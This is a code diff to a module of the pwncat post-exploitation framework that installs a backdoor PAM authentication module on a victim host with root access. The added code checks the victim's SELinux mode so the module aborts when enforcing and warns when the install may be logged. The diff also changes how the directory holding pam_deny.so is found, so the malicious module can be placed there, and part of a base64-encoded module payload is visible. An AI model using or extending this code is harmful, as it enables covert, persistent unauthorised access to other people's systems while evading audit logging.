@@ -9,7 +9,7 @@ from typing import Optional
 import pwncat
 from pwncat import util
 from pwncat.persist import PersistenceMethod, PersistenceError
-from pwncat.util import Access, CompilationError
+from pwncat.util import Access, CompilationError, console
 
 
 class Method(PersistenceMethod):
@@ -36,6 +36,21 @@ class Method(PersistenceMethod):
 
         if pwncat.victim.current_user.id != 0:
             raise PersistenceError("must be root")
+
+        try:
+            # Enumerate SELinux state
+            selinux = pwncat.victim.enumerate.first("system.selinux").data
+            # If enabled and enforced, it will block this from working
+            if selinux.enabled and "enforc" in selinux.mode:
+                raise PersistenceError("selinux is currently in enforce mode")
+            elif selinux.enabled:
+                # If enabled but permissive, it will log this module
+                console.log(
+                    "[yellow]warning[/yellow]: selinux is enabled; persistence may be logged"
+                )
+        except ValueError:
+            # SELinux not found
+            pass
 
         # Source to our module
         sneaky_source = textwrap.dedent(
@@ -195,17 +210,17 @@ Z3YpewogICAgIHJldHVybiBQQU1fSUdOT1JFOwp9Cg==
 
             # Locate the pam_deny.so to know where to place the new module
             pam_modules = "/usr/lib/security"
-            try:
-                results = (
-                    pwncat.victim.env(["find", "/", "-name", "pam_deny.so"])
-                    .strip()
-                    .decode("utf-8")
+
+            results = (
+                pwncat.victim.run(
+                    "find / -name pam_deny.so 2>/dev/null | grep -v 'snap/'"
                 )
-                if results != "":
-                    results = results.split("\n")
-                    pam_modules = os.path.dirname(results[0])
-            except FileNotFoundError:
-                pass
+                .strip()
+                .decode("utf-8")
+            )
+            if results != "":
+                results = results.split("\n")
+                pam_modules = os.path.dirname(results[0])
 
             # Ensure the directory exists and is writable
             access = pwncat.victim.access(pam_modules)
